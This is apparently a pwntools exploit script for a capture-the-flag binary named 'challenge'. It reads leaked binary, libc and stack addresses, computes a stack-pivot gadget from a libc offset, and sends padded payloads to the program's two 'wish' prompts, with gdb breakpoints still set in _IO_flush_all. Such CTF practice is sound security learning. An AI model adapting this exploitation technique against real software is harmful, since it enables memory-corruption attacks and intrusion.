#!/usr/bin/env python3

from pwn import *

exe = ELF("challenge")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process([exe.path])
gdb.attach(p, gdbscript="""
b *_IO_flush_all+227
b *_IO_flush_all+600
c
""")

exe.address = int(p.recvuntil(b"-", drop=True).decode().split()[-1], 16)
log.info(f"{hex(exe.address)=}")

p.recvuntil(b"heap")
libc_leak = int(p.recvuntil(b"-", drop=True).decode().split()[-1], 16)
log.info(f"{hex(libc_leak)=}")

p.recvuntil(b"stacks ")
stack_leak = int(p.recvline().decode().split()[0], 16)

rbp_addr = stack_leak-143
rbp_addr_byte = ((rbp_addr & 0xff00) >> 8) - 0x20
log.info(f"{hex(rbp_addr)=}")
log.info(f"{hex(rbp_addr_byte)=}")

add_rsp = libc_leak + 0x9635e
log.info(f"{hex(add_rsp)=}")

payload = b"80"*8 + b"A"*100000
# log.info(f"{payload=}")

p.sendlineafter(b"first wish?", str(hex(stack_leak))[2:].encode())
p.sendlineafter(b"here?", b"A"*10000)

p.sendlineafter(b"second wish?", str(hex(add_rsp))[2:].encode())
p.sendlineafter(b"here?", payload)

p.interactive()
